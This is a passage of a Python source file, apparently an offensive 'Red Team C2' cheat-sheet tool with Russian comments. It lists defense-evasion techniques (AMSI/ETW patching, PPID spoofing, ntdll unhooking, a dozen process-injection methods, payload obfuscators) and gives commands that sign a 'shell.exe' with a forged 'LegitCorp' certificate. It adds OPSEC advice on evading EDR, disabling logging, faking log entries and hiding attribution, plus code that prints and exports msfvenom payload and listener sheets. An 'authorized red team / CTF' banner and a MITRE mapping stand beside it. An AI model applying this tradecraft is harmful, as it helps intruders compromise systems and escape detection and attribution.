            "[System.Reflection.Assembly]::LoadWithPartialName('System.Core')",
            "$p=[System.Diagnostics.Process]::GetCurrentProcess()",
            "# Enumerate providers, patch EtwEventWrite в ntdll",
            "# Через Cobalt Strike: 'etw patch' в beacon",
            "# Через SharpPatch: .\\SharpPatch.exe --all",
        ],
    },
    "ppid_spoof": {
        "title": "PPID spoofing (parent process)",
        "commands": [
            "# Cobalt Strike: spawnas svchost.exe <pid>",
            "# Havoc: Config → Parent PID: explorer.exe / svchost.exe",
            "# Sliver: --ppid <pid> при spawn",
            "# Custom: CreateProcess с STARTUPINFOEX + "
            "PROC_THREAD_ATTRIBUTE_PARENT_PROCESS",
        ],
    },
    "unhooking": {
        "title": "Userland unhooking (ntdll)",
        "commands": [
            "# 1. Fresh copy из диска:",
            "# 2. Hell's Gate / Tartarus Gate",
            "# 3. Perun's Fart / Halo's Gate",
            "# 4. Manual mapping",
            "# Готовые: SharpUnhooker, UnhookMe, "
            "https://github.com/klezvirus/Injectors",
        ],
    },
    "process_injection": {
        "title": "Process injection (10+ техник)",
        "commands": [
            "# 1. Classic: OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread",
            "# 2. APC Injection: QueueUserAPC",
            "# 3. Early Bird: APC в свежий процесс (до начала)",
            "# 4. Process Hollowing (RunPE): CreateProcess(SUSPENDED) → Unmap → WriteImage → ResumeThread",
            "# 5. Thread Hijacking: SuspendThread → SetThreadContext → ResumeThread",
            "# 6. Atom Bombing: GlobalAddAtom + APC",
            "# 7. DLL Injection: CreateRemoteThread + LoadLibrary",
            "# 8. Reflective DLL Injection (rdi)",
            "# 9. Manual Mapping",
            "# 10. Module Stomping (маскировка под legit dll)",
            "# 11. Pool Party (thread pool)",
            "# 12. ROP-инъекция",
            "# Инструменты: Cobalt Strike 'inject', havoc 'Demon → inject', "
            "Sliver 'sideload', SharpInject",
        ],
    },
    "obfuscation": {
        "title": "Payload obfuscation",
        "commands": [
            "# ConfuserEx (для .NET)",
            "# .NET Reactor (commercial)",
            "# Themida / VMProtect (commercial)",
            "# Enigma Protector",
            "# SGN (shellcode encoder)",
            "# Invoke-Obfuscation (PowerShell)",
            "# Chimera (PowerShell)",
            "# SharpObfuscator (C#)",
        ],
    },
    "signature_bypass": {
        "title": "Signature bypass / signing",
        "commands": [
            "# Самоподписанный сертификат:",
            "openssl req -x509 -newkey rsa:2048 -keyout k.pem "
            "-out c.pem -days 365 -nodes -subj '/CN=LegitCorp'",
            "openssl pkcs12 -export -out sign.pfx -inkey k.pem -in c.pem",
            "osslsigncode sign -pkcs12 sign.pfx -pass pwd "
            "-in shell.exe -out signed.exe",
            "# Lolbin signing: используй подписанный legit бинарник",
            "# Signature spoofing: подделка через leaked cert",
        ],
    },
}


# ===========================================================================
# OPSEC (расширенный)
# ===========================================================================

OPSEC_NOTES = [
    ("🌐 Network indicators", "high", [
        "Избегай прямых соединений к IP — используй домены с CDN fronting",
        "Меняй User-Agent, добавляй реалистичные Accept-* заголовки",
        "Используй HTTPS/TLS с валидным сертификатом (Let's Encrypt)",
        "Jitter 30-60% в beacon sleep — не идеально ровные интервалы",
        "Разнесение callback'ов по времени — не burst в 00:00",
        "Разные redirectors для разных операторов",
        "Избегай популярных TLS-фингерпринтов (JA3)",
        "Используй прокси/C2 через residential IP (если нужно)",
    ]),
    ("💻 Host indicators", "high", [
        "Избегай powershell.exe -enc — детектится всеми EDR",
        "Не оставляй файлы на диске — используй reflective loading",
        "Не делай persistence сразу — сначала собери инфу, потом закрепись",
        "Проверяй EDR/AV перед активностью (tasklist / Get-Process)",
        "PPID spoofing — маскируй parent под explorer.exe / svchost.exe",
        "Process injection → в legit процессы (notepad, svchost)",
        "Убирай CommandLine (eventID 1) — обфусцируй",
        "Отключай ETW / AMSI при первой возможности",
    ]),
    ("🔐 Privileges", "medium", [
        "Работай от low-priv пользователя — меньше шансов детекта",
        "Не трогай lsass.exe без острой необходимости — Sysmon 10",
        "Используй userland hooks bypass (Unhooking, ETW patching)",
        "Для DA/EA: сначала stealthy user creation, потом backdoor",
        "Kerberoasting — тише чем DCSync",
        "Для domain admin — используй golden ticket, а не прямые kredy",
    ]),
    ("📋 Logs / IR", "high", [
        "Избегай eventvwr.exe, wevtutil cl (очистка логов = алерт)",
        "Sysmon EventID 1 → обфусцируй CommandLine",
        "Не выполняй команды, которые оставят уникальный след",
        "(типа 'whoami /priv' в самом начале)",
        "Фальшивые лог-записи через log injection — если нужно",
        "PowerShell transcripts → отключить (registry / GPO)",
    ]),
    ("🕒 Timing", "medium", [
        "Работай в рабочие часы (смешивайся с legit traffic)",
        "Долгие паузы между этапами (нет burst'ов активности)",
        "Beacon sleep 60+ секунд с jitter",
        "Имитация 'user не в сети' (Обед, ночь)",
    ]),
    ("🎭 Attribution", "high", [
        "Не используй личные домены / аккаунты",
        "Разные VPS на разных провайдерах",
        "Crypto pay — Monero > Bitcoin",
        "Никогда не смешивай лабораторию и реальные операции",
        "VPS через VPN / TOR",
    ]),
]


# ===========================================================================
# MITRE ATT&CK mapping
# ===========================================================================

MITRE_MAPPING = {
    "T1071.001": {"tactic": "command-and-control",
                  "name": "Web Protocols (HTTP/HTTPS C2)",
                  "detect": "JA3, beacon interval analysis"},
    "T1071.004": {"tactic": "command-and-control",
                  "name": "DNS C2",
                  "detect": "DNS tunneling, NXDOMAIN burst"},
    "T1090.003": {"tactic": "command-and-control",
                  "name": "Multi-hop Proxy",
                  "detect": "Domain fronting, redirect chains"},
    "T1090.004": {"tactic": "command-and-control",
                  "name": "Domain Fronting",
                  "detect": "SNI ≠ Host header"},
    "T1573.002": {"tactic": "command-and-control",
                  "name": "Asymmetric Cryptography (TLS)",
                  "detect": "JA3S, non-standard TLS"},
    "T1566":     {"tactic": "initial-access",
                  "name": "Phishing",
                  "detect": "Email gateway, attachment sandboxing"},
    "T1059.001": {"tactic": "execution",
                  "name": "PowerShell",
                  "detect": "ScriptBlockLogging, AMSI"},
    "T1059.003": {"tactic": "execution",
                  "name": "Windows Command Shell",
                  "detect": "Sysmon 1, parent-child anomaly"},
    "T1055":     {"tactic": "defense-evasion",
                  "name": "Process Injection",
                  "detect": "Sysmon 8/10, EDR API hooks"},
    "T1055.012": {"tactic": "defense-evasion",
                  "name": "Process Hollowing",
                  "detect": "Image mismatch, SectionMap"},
    "T1620":     {"tactic": "defense-evasion",
                  "name": "Reflective Code Loading",
                  "detect": "In-memory PE, no file on disk"},
    "T1027":     {"tactic": "defense-evasion",
                  "name": "Obfuscated Files",
                  "detect": "Entropy analysis, YARA"},
    "T1562.001": {"tactic": "defense-evasion",
                  "name": "Disable Tools (AMSI/ETW)",
                  "detect": "Registry, hook tampering"},
    "T1070.004": {"tactic": "defense-evasion",
                  "name": "File Deletion",
                  "detect": "Sysmon 23"},
    "T1003.001": {"tactic": "credential-access",
                  "name": "LSASS Memory",
                  "detect": "Sysmon 10 (lsass access)"},
    "T1558.003": {"tactic": "credential-access",
                  "name": "Kerberoasting",
                  "detect": "EventID 4769 RC4"},
    "T1021.002": {"tactic": "lateral-movement",
                  "name": "SMB Admin Shares",
                  "detect": "EventID 5140, Sysmon 3"},
    "T1570":     {"tactic": "lateral-movement",
                  "name": "Lateral Tool Transfer",
                  "detect": "File transfer to remote hosts"},
    "T1486":     {"tactic": "impact",
                  "name": "Data Encrypted for Impact",
                  "detect": "Mass file ops, shadow copy deletion"},
}


# ===========================================================================
# Display helpers
# ===========================================================================

def _print_cmds(title: str, cmds: list[str], ctx: dict | None = None,
                border_style: str = "dim") -> None:
    t = Table(title=f"[bold green]{title}[/bold green]",
              show_header=False, border_style=border_style)
    t.add_column("Command")
    for c in cmds:
        try:
            formatted = c.format(**(ctx or {}))
        except (KeyError, IndexError):
            formatted = c
        for line in formatted.split("\n"):
            t.add_row(f"[green]{line}[/green]")
    console.print(t)


def show_c2_sheet(name: str) -> None:
    sheet = C2_SHEETS.get(name)
    if not sheet:
        console.print(f"[red]Неизвестный C2: {name}[/red]")
        console.print(f"[dim]{list(C2_SHEETS.keys())}[/dim]")
        return
    console.print(f"\n[bold cyan]═══ {sheet['title']} ═══[/bold cyan]")
    console.print(f"[dim]Language: {sheet.get('language', '?')} | "
                  f"License: {sheet.get('license', '?')}[/dim]\n")

    if "install" in sheet:
        _print_cmds("📦 Install", sheet["install"], border_style="cyan")

    if "workflow" in sheet:
        for step_title, cmd in sheet["workflow"]:
            t = Table(title=f"[bold green]{step_title}[/bold green]",
                      show_header=False, border_style="dim")
            t.add_column("Command")
            for line in cmd.split("\n"):
                t.add_row(f"[green]{line}[/green]")
            console.print(t)

    console.print("\n[yellow]⚠ Только для авторизованного red team / CTF."
                  "[/yellow]")


def show_msfvenom(lhost: str, lport: str) -> None:
    console.print(f"\n[bold cyan]═══ MSFVenom payloads "
                  f"({lhost}:{lport}) ═══[/bold cyan]\n")
    ctx = {"lhost": lhost, "lport": lport}
    for category, cmds in MSFVENOM_SHEETS.items():
        _print_cmds(category, cmds, ctx=ctx)

    # Findings: audit trail
    _save_finding(C2Finding(
        kind="msfvenom_payload_generated",
        severity="high",
        title=f"MSFVenom payloads для {lhost}:{lport}",
        target=f"{lhost}:{lport}",
        evidence=f"Категорий: {len(MSFVENOM_SHEETS)}",
        data={"lhost": lhost, "lport": lport,
              "categories": list(MSFVENOM_SHEETS.keys())},
    ))

    db.save_scan("redteam_msfvenom", f"{lhost}:{lport}",
                 {"categories": list(MSFVENOM_SHEETS.keys())})
    _notify(f"MSFVenom payloads {lhost}:{lport}", "high")


def show_payload_generators() -> None:
    console.print("\n[bold cyan]═══ Payload generators "
                  "═══[/bold cyan]\n")
    for key, gen in PAYLOAD_GENERATORS.items():
        console.print(f"[bold yellow]{gen['title']}[/bold yellow]")
        console.print(f"[dim]{gen['url']}[/dim]")
        _print_cmds("Commands", gen["commands"])


def show_listeners(lhost: str = "10.0.0.1", lport: str = "4444") -> None:
    console.print("\n[bold cyan]═══ Listener setup "
                  "═══[/bold cyan]\n")
    ctx = {"lhost": lhost, "lport": lport}
    for key, lst in LISTENERS.items():
        console.print(f"[bold yellow]{lst['title']}[/bold yellow]")
        _print_cmds("Commands", lst["commands"], ctx=ctx)


def show_infrastructure() -> None:
    console.print("\n[bold cyan]═══ Red Team Infrastructure "
                  "═══[/bold cyan]\n")
    for key, infra in INFRASTRUCTURE.items():
        console.print(f"\n[bold yellow]{infra['title']}[/bold yellow]")
        if "config" in infra:
            console.print(f"[green]{infra['config']}[/green]")
        if "commands" in infra:
            _print_cmds("Commands", infra["commands"])
        if "notes" in infra:
            for n in infra["notes"]:
                console.print(f"  [white]• {n}[/white]")


def show_defense_evasion() -> None:
    console.print("\n[bold cyan]═══ Defense Evasion "
                  "═══[/bold cyan]\n")
    for key, ev in DEFENSE_EVASION.items():
        console.print(f"\n[bold yellow]{ev['title']}[/bold yellow]")
        _print_cmds("Commands", ev["commands"])


def show_opsec() -> None:
    console.print("\n[bold cyan]═══ OpSec notes ═══[/bold cyan]\n")
    for category, sev, notes in OPSEC_NOTES:
        color = {"high": "red", "medium": "yellow",
                 "low": "green"}.get(sev, "white")
        t = Table(title=f"[bold {color}]{category} "
                        f"[{sev}][/{color}]",
                  show_header=False, border_style="dim")
        t.add_column("Note")
        for n in notes:
            t.add_row(f"[white]• {n}[/white]")
        console.print(t)


def show_donut() -> None:
    gen = PAYLOAD_GENERATORS["donut"]
    console.print(f"\n[bold cyan]═══ {gen['title']} "
                  f"═══[/bold cyan]")
    console.print(f"[dim]{gen['url']}[/dim]\n")
    _print_cmds("Commands", gen["commands"])


def show_mitre_mapping() -> None:
    t = Table(title=f"🗺  MITRE ATT&CK mapping ({len(MITRE_MAPPING)})")
    t.add_column("TTP", style="cyan", width=12)
    t.add_column("Tactic", style="magenta", width=22)
    t.add_column("Name", style="white", width=32)
    t.add_column("Detection", style="yellow", max_width=40)
    for ttp, data in MITRE_MAPPING.items():
        t.add_row(ttp, data["tactic"], data["name"],
                  data["detect"][:40])
    console.print(t)


# ===========================================================================
# Notify
# ===========================================================================

def _notify(title: str, severity: str = "high") -> None:
    try:
        from modules import notifier
        notifier.notify_all(f"🎯 {title}", "redteam_c2: generated",
                            severity=severity)
    except Exception:
        pass


# ===========================================================================
# Export
# ===========================================================================

def export_cheatsheet(section: str = "all",
                      lhost: str = "", lport: str = "4444",
                      fmt: str = "md",
                      out_path: str | None = None) -> Path | None:
    """
    Экспорт cheat-sheet.
    section: 'all' | 'c2' | 'msfvenom' | 'generators' | 'listeners' |
             'infra' | 'evasion' | 'opsec' | 'mitre'
    fmt: 'md' | 'txt' | 'json' | 'sh'
    """
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    if not out_path:
        ext = {"md": ".md", "txt": ".txt",
               "json": ".json", "sh": ".sh"}[fmt]
        out_path = str(RT_DIR / f"redteam_{section}_{ts}{ext}")

    ctx = {"lhost": lhost or "LHOST", "lport": lport or "LPORT"}

    try:
        if fmt == "json":
            data: dict = {"generated": datetime.now().isoformat(),
                          "lhost": lhost, "lport": lport}
            if section in ("all", "c2"):
                data["c2_sheets"] = {
                    k: {"title": v["title"], "install": v.get("install", []),
                        "workflow": v.get("workflow", [])}
                    for k, v in C2_SHEETS.items()
                }
            if section in ("all", "msfvenom"):
                data["msfvenom"] = MSFVENOM_SHEETS
            if section in ("all", "generators"):
                data["generators"] = PAYLOAD_GENERATORS
            if section in ("all", "listeners"):
                data["listeners"] = LISTENERS
            if section in ("all", "infra"):
                data["infrastructure"] = INFRASTRUCTURE
            if section in ("all", "evasion"):
                data["defense_evasion"] = DEFENSE_EVASION
            if section in ("all", "opsec"):
                data["opsec"] = [
                    {"category": c, "severity": s, "notes": n}
                    for c, s, n in OPSEC_NOTES
                ]
            if section in ("all", "mitre"):
                data["mitre"] = MITRE_MAPPING
            Path(out_path).write_text(
                json.dumps(data, indent=2, ensure_ascii=False,
                            default=str),
                encoding="utf-8",
            )
        elif fmt == "sh":
            lines = [
                "#!/usr/bin/env bash",
                f"# Red Team C2 cheatsheet — {section}",
                f"# Generated: {datetime.now().isoformat()}",
                f"# LHOST={lhost or 'LHOST'}, LPORT={lport or 'LPORT'}",
                "",
            ]
            if section in ("all", "msfvenom"):
                lines.append("# ===== MSFVenom =====")
                for cat, cmds in MSFVENOM_SHEETS.items():
                    lines.append(f"# --- {cat} ---")
                    for c in cmds:
                        try:
                            lines.append(c.format(**ctx))
                        except KeyError:
                            lines.append(c)
                    lines.append("")
            if section in ("all", "listeners"):
                lines.append("# ===== Listeners =====")
                for lst in LISTENERS.values():
                    lines.append(f"# --- {lst['title']} ---")
                    for c in lst["commands"]:
                        try:
                            lines.append(c.format(**ctx))
                        except KeyError:
                            lines.append(c)
                    lines.append("")
            Path(out_path).write_text("\n".join(lines), encoding="utf-8")
            try:
                import os
                os.chmod(out_path, 0o755)
            except Exception:
                pass
        elif fmt == "txt":
            lines = [f"=== Red Team C2 — {section} ==="]
            lines.append(f"Generated: {datetime.now().isoformat()}")
            lines.append("")
            if section in ("all", "c2"):
                lines.append("=== C2 Frameworks ===")
                for k, v in C2_SHEETS.items():
                    lines.append(f"\n--- {k}: {v['title']} ---")
                    for c in v.get("install", []):
                        lines.append(c)
            if section in ("all", "msfvenom"):
                lines.append("\n=== MSFVenom ===")
                for cat, cmds in MSFVENOM_SHEETS.items():
                    lines.append(f"\n--- {cat} ---")
                    for c in cmds:
                        try:
                            lines.append(c.format(**ctx))
                        except KeyError:
                            lines.append(c)
            Path(out_path).write_text("\n".join(lines), encoding="utf-8")
        else:  # md
            lines = [f"# Red Team C2 Cheatsheet — {section}", ""]
            lines.append(f"_Generated: {datetime.now().isoformat()}_  ")
            if lhost:
                lines.append(f"_LHOST: `{lhost}`_  ")
            if lport:
                lines.append(f"_LPORT: `{lport}`_  ")
            lines.append("")

            if section in ("all", "c2"):
                lines.append("## C2 Frameworks")
                lines.append("")
                for k, v in C2_SHEETS.items():
                    lines.append(f"### {k}: {v['title']}")
                    if v.get("install"):
                        lines.append("**Install:**")
                        lines.append("```bash")
                        lines.extend(v["install"])
                        lines.append("```")
                    if v.get("workflow"):
                        for step, cmd in v["workflow"]:
                            lines.append(f"**{step}:**")
                            lines.append("```bash")
                            try:
                                lines.append(cmd.format(**ctx))
                            except KeyError:
                                lines.append(cmd)
                            lines.append("```")
                    lines.append("")

            if section in ("all", "msfvenom"):
                lines.append("## MSFVenom")
                lines.append("")
                for cat, cmds in MSFVENOM_SHEETS.items():
                    lines.append(f"### {cat}")
                    lines.append("```bash")
                    for c in cmds:
                        try:
                            lines.append(c.format(**ctx))
                        except KeyError:
                            lines.append(c)
                    lines.append("```")
                    lines.append("")

            if section in ("all", "listeners"):
                lines.append("## Listeners")
                lines.append("")
                for k, lst in LISTENERS.items():
                    lines.append(f"### {lst['title']}")
                    lines.append("```bash")
                    for c in lst["commands"]:
                        try:
                            lines.append(c.format(**ctx))
                        except KeyError:
                            lines.append(c)
                    lines.append("```")
                    lines.append("")

            Path(out_path).write_text("\n".join(lines), encoding="utf-8")

        console.print(f"[green]✓ {fmt.upper()}: {out_path}[/green]")
        db.save_scan("redteam_export", section,
                     {"path": str(out_path), "fmt": fmt})
        return Path(out_path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка экспорта: {exc}[/red]")
        return None


# ===========================================================================
# CLI (сохранены все старые + новые)
# ===========================================================================

def cli_sheets() -> None:
    t = Table(title=f"🎯 C2 cheat-sheets ({len(C2_SHEETS)})")
    t.add_column("Key", style="cyan", width=16)
    t.add_column("Framework", style="white", width=32)
    t.add_column("Language", style="magenta", width=16)
    t.add_column("License", style="dim", width=15)
    for k, v in C2_SHEETS.items():
        t.add_row(k, v["title"], v.get("language", "?"),
                  v.get("license", "?"))
    console.print(t)


def cli_sliver() -> None: show_c2_sheet("sliver")
def cli_havoc() -> None: show_c2_sheet("havoc")
def cli_mythic() -> None: show_c2_sheet("mythic")
def cli_msfvenom(lhost: str, lport: str) -> None: show_msfvenom(lhost, lport)
def cli_opsec() -> None: show_opsec()
def cli_donut() -> None: show_donut()
def cli_generators() -> None: show_payload_generators()
def cli_listeners(lhost: str = "10.0.0.1", lport: str = "4444") -> None:
    show_listeners(lhost, lport)
def cli_infrastructure() -> None: show_infrastructure()
def cli_evasion() -> None: show_defense_evasion()
def cli_mitre() -> None: show_mitre_mapping()
def cli_c2(name: str) -> None: show_c2_sheet(name)
def cli_export(section: str = "all", fmt: str = "md",
               lhost: str = "", lport: str = "4444") -> None:
    export_cheatsheet(section, lhost, lport, fmt)


# ===========================================================================
# Menu
# ===========================================================================

def menu() -> None:
    t = Table(title="[bold]🎯 Red Team C2 Integration Pro[/bold]")
    t.add_column("№", style="yellow")
    t.add_column("Опция")
    opts = [
        ("1", f"Список C2 cheat-sheets ({len(C2_SHEETS)} фреймворков)"),
        ("2", "Sliver C2"),
        ("3", "Havoc C2"),
        ("4", "Mythic C2"),
        ("5", "Cobalt Strike"),
        ("6", "Metasploit"),
        ("7", "Другой C2 (по ключу)"),
        ("8", "MSFVenom payloads (15+ категорий)"),
        ("9", "Payload generators (12)"),
        ("10", "Listener setup (6)"),
        ("11", "Red team infrastructure"),
        ("12", "Defense evasion (AMSI/ETW/injection)"),
        ("13", "OpSec notes"),
        ("14", "Donut (shellcode generator)"),
        ("15", "MITRE ATT&CK mapping"),
        ("16", "📄 Экспорт cheat-sheet (md/json/txt/sh)"),
    ]
    for n, o in opts:
        t.add_row(n, o)
    console.print(t)
    console.print("[yellow]⚠ Только для авторизованного red team / CTF.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        cli_sheets()
    elif c == "2":
        cli_sliver()
    elif c == "3":
        cli_havoc()
    elif c == "4":
        cli_mythic()
    elif c == "5":
        cli_c2("cobaltstrike")
    elif c == "6":
        cli_c2("metasploit")
    elif c == "7":
        key = Prompt.ask("Ключ C2", choices=list(C2_SHEETS.keys()))
        cli_c2(key)
    elif c == "8":
        lh = Prompt.ask("LHOST", default="10.0.0.1")
        lp = Prompt.ask("LPORT", default="4444")
        cli_msfvenom(lh, lp)
    elif c == "9":
        cli_generators()
    elif c == "10":
        lh = Prompt.ask("LHOST", default="10.0.0.1")
        lp = Prompt.ask("LPORT", default="4444")
        cli_listeners(lh, lp)
    elif c == "11":
        cli_infrastructure()
    elif c == "12":
        cli_evasion()
    elif c == "13":
        cli_opsec()
    elif c == "14":
        cli_donut()
    elif c == "15":
        cli_mitre()
    elif c == "16":
        section = Prompt.ask(
            "Раздел",
            choices=["all", "c2", "msfvenom", "generators",
                     "listeners", "infra", "evasion", "opsec", "mitre"],
            default="all",
        )
        fmt = Prompt.ask("Формат",
                         choices=["md", "json", "txt", "sh"],
                         default="md")
        lh = Prompt.ask("LHOST (опц.)", default="").strip()
        lp = Prompt.ask("LPORT", default="4444")
        cli_export(section, fmt, lh, lp)